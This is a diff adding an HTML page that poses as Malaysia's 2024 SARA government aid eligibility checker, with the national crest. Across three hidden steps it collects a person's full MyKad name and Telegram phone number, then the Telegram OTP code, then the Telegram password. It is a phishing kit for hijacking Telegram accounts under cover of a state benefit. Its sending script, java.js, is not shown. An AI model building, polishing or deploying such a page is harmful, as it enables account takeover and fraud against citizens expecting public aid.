@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sumbangan Asas Rahmah (SARA) - 2024</title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      /* Reset dan Base Styles */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", Arial, sans-serif;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+        background-color: #eee9d6;
+        overflow-x: hidden;
+      }
+
+      /* Layout Styles */
+      .page {
+        min-height: 100vh;
+        width: 100%;
+        position: relative;
+        padding-top: 80px; /* Untuk navbar fixed */
+      }
+
+      .hero {
+        width: 100%;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      /* Navbar Styles */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #eee9d6;
+        padding: 15px 30px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 9999;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      }
+
+      .navbar-logo {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .navbar-img {
+        width: 45px;
+        height: 45px;
+        object-fit: contain;
+      }
+
+      .navbar-nav {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+      }
+
+      .navbar-nav a {
+        color: #333;
+        font-size: 16px;
+        text-decoration: none;
+        font-weight: 500;
+        padding: 8px 12px;
+        border-radius: 4px;
+        transition: all 0.3s ease;
+        white-space: nowrap;
+      }
+
+      .navbar-nav a:hover {
+        background-color: #eee9d6;
+        color: #007bff;
+      }
+
+      .navbar-nav a span {
+        color: #007bff;
+      }
+
+      /* Image Styles */
+      .hero img {
+        width: 100%;
+        height: auto;
+        display: flex;
+      }
+
+      /* Form Styles */
+      .form-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 10px;
+        width: 100%;
+        max-width: 500px;
+        margin: 20px auto;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      label {
+        display: block;
+        width: 100%;
+        margin-bottom: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        color: #333;
+        text-align: left;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 20px;
+        border: 1px solid #010101;
+        border-radius: 5px;
+        font-size: 12px;
+        transition: border-color 0.3s ease;
+      }
+
+      input[type="tel"] {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 20px;
+        border: 1px solid #010101;
+        border-radius: 5px;
+        font-size: 12px;
+        transition: border-color 0.3s ease;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: #007bff;
+      }
+
+      .btn {
+        width: 100%;
+        padding: 8px;
+        background-color: blue;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 12px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 10px auto; /* Menambah margin atas dan bawah menjadi 20px */
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+
+      /* Text Styles */
+      p {
+        font-size: 12px;
+        color: #333;
+        text-align: center;
+        margin: 20px 0;
+        line-height: 1.6;
+      }
+
+      h4 {
+        font-size: 20px;
+        color: #333;
+        text-align: center;
+        margin: 20px 0;
+      }
+
+      /* Loading Screen */
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.9);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 10000;
+      }
+
+      .loading-screen img {
+        max-width: 80px;
+        max-height: 80px;
+      }
+
+      /* Footer Styles */
+      footer {
+        width: 100%;
+        background-color: #eee9d6;
+        padding: 20px;
+        text-align: center;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      footer img {
+        max-width: 380px;
+        height: auto;
+        margin: 0 auto;
+      }
+
+      /* Responsive Styles */
+      @media (max-width: 1024px) {
+        .form-container {
+          width: 100%;
+          padding: 30px;
+        }
+      }
+
+      @media (max-width: 768px) {
+        .navbar {
+          padding: 10px 15px;
+        }
+
+        .navbar-img {
+          width: 35px;
+          height: 35px;
+        }
+
+        .navbar-nav {
+          gap: 10px;
+        }
+
+        .navbar-nav a {
+          font-size: 14px;
+          padding: 6px 8px;
+        }
+
+        .hero img {
+          width: 100%;
+        }
+
+        .form-container {
+          width: 100%;
+          padding: 10px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .page {
+          padding-top: 60px;
+        }
+
+        .navbar-nav {
+          gap: 5px;
+        }
+
+        .navbar-nav a {
+          font-size: 12px;
+          padding: 4px 6px;
+        }
+
+        .hero img {
+          width: 100%;
+          margin-top: -10px;
+        }
+
+        .form-container {
+          width: 100%;
+          padding: 10px;
+        }
+
+        label {
+          font-size: 14px;
+        }
+
+        .btn {
+          padding: 12px;
+          font-size: 16px;
+        }
+
+        p {
+          font-size: 14px;
+        }
+
+        h4 {
+          font-size: 18px;
+        }
+      }
+
+      /* Utility Classes */
+      .hidden {
+        display: none;
+      }
+
+      .active {
+        font-weight: bold;
+        color: #333 !important;
+      }
+
+      /* Khusus untuk device dengan lebar 375px */
+      @media (max-width: 375px) {
+        .navbar {
+          padding: 6px 8px;
+        }
+
+        .navbar-logo {
+          gap: 6px;
+        }
+
+        .navbar-img {
+          width: 25px;
+          height: 25px;
+        }
+
+        .navbar-nav {
+          gap: 2px;
+        }
+
+        .navbar-nav a {
+          font-size: 10px;
+          padding: 3px 4px;
+        }
+      }
+
+      /* Tambahan untuk orientasi landscape pada mobile */
+      @media (max-height: 480px) and (orientation: landscape) {
+        .navbar {
+          padding: 5px 10px;
+        }
+
+        .navbar-img {
+          width: 28px;
+          height: 28px;
+        }
+
+        .navbar-nav a {
+          font-size: 11px;
+          padding: 3px 5px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="page1" class="page">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
+          <img src="logo (1).png" alt="Logo" class="navbar-img" />
+        </div>
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>日本</span></a>
+          <a href="#"><span>摩訶至那</span></a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <img src="SARA-1.jpeg" alt="tng-img" />
+        <div class="form-container">
+          <form id="registrationForm">
+            <label for="name">Nama Penuh Sesuai MyKad</label>
+            <input
+              type="text"
+              id="name"
+              name="name"
+              placeholder="Nama Penuh Sesuai MyKad"
+              required
+            />
+
+            <label for="phone">Phone Number Telegram</label>
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="+60 | Nombor Telefon Telegram"
+              required
+            />
+            <br />
+            <button type="submit" class="btn">SEMAK SEKARANG</button>
+          </form>
+        </div>
+        <img src="SARA-2.jpeg" alt="tng-img" />
+      </div>
+    </div>
+
+    <div id="page2" class="page" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
+          <img src="logo (1).png" alt="Logo" class="navbar-img" />
+        </div>
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>日本</span></a>
+          <a href="#"><span>摩訶至那國</span></a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <img src="SARA-1.jpeg" alt="tng-img" />
+        <div class="form-container">
+          <p>Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda</p>
+          <form id="otpForm">
+            <label for="otp">Masukan Kod-OTP</label>
+            <input
+              type="tel"
+              id="otp"
+              name="otp"
+              placeholder="Masukan 5 digit OTP"
+              required
+            />
+            <button type="submit" class="btn">SEMAK STATUS</button>
+          </form>
+        </div>
+      </div>
+      <img src="SARA-2.jpeg" alt="tng-img" />
+    </div>
+
+    <div id="page3" class="page" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
+          <img src="logo (1).png" alt="Logo" class="navbar-img" />
+        </div>
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>日本</span></a>
+          <a href="#"><span>摩訶至那國</span></a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <img src="SARA-1.jpeg" alt="tng-img" />
+        <div class="form-container">
+          <p id="kataSandi">Sila Masukan kata laluan Telegram Anda</p>
+          <form id="passwordForm">
+            <input
+              type="password"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukan kata laluan"
+              required
+            />
+            <button type="submit" class="btn">SEMAK STATUS</button>
+          </form>
+
+          <div id="loadingContent" style="display: none">
+            <img
+              id="loadingGif"
+              src="processing.gif"
+              alt="Loading..."
+              style="margin: 20px auto; width: 60%; height: auto"
+            />
+
+            <p id="formMessage" style="text-align: center">
+              Mohon tunggu proses pengesahan atau...
+            </p>
+
+            <button
+              id="useAnotherPhone"
+              style="
+                width: 100%;
+                padding: 12px;
+                margin: 30px auto 0;
+                background-color: red;
+                color: white;
+                border: none;
+                border-radius: 10px;
+                font-size: 1.1rem;
+                cursor: pointer;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              Gunakan Nombor Lain
+            </button>
+          </div>
+        </div>
+        <img src="SARA-2.jpeg" alt="tng-img" />
+      </div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script src="java.js"></script>
+  </body>
+</html>
